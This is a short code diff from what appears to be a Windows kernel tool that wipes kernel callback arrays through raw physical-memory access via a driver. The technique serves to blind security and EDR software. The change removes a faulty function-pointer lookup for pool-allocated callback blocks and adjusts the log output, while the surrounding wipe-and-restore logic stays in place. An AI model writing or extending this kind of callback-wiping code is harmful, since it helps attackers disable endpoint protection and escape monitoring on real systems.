@@ -412,26 +412,16 @@ static int wipe_callback_array(uint64_t array_va, const char *label)
         if (block_va < 0xFFFF800000000000ULL) continue; /* not a kernel VA */
 
         /*
-         * EX_CALLBACK_ROUTINE_BLOCK layout:
-         *   +0x00  EX_RUNDOWN_REF   (8 bytes, lock/ref)
-         *   +0x08  PVOID Function   (actual callback pointer)
-         * Read the function pointer from the block to name the driver.
+         * EX_CALLBACK_ROUTINE_BLOCK is always pool-allocated — never within
+         * ntoskrnl's physical mapping.  Translating block_va to a physical
+         * address requires walking page tables via kernel CR3, which is not
+         * available in this tool.  On Hyper-V the PTE pages are also
+         * SLAT-read-protected from the AMD driver.  The wipe below uses
+         * slot_pa derived from ntoskrnl .data (correct) and is unaffected.
          */
-        uint64_t block_pa = g_nt_pa + (block_va - g_nt_va);
-        uint64_t fn_ptr = 0;
-        if (in_range(block_pa + 8, 8))
-            fn_ptr = phys_read64(block_pa + 8);
-
-        /* If block_pa is outside ntoskrnl range it's in a driver's pool */
-        if (!in_range(block_pa, 8)) {
-            /* block is in pool — skip fn_ptr read, just report entry VA */
-            fn_ptr = block_va;
-        }
-
-        const char *drv = identify_driver(fn_ptr ? fn_ptr : block_va);
         printf("    slot[%2d] entry=%016"PRIx64"  block_va=%016"PRIx64
-               "  fn=%016"PRIx64"  <%s>\n",
-               i, entry, block_va, fn_ptr, drv);
+               "  fn=(pool, no CR3)\n",
+               i, entry, block_va);
 
         /* Save original for restore */
         if (g_nsaved < MAX_SAVED) {
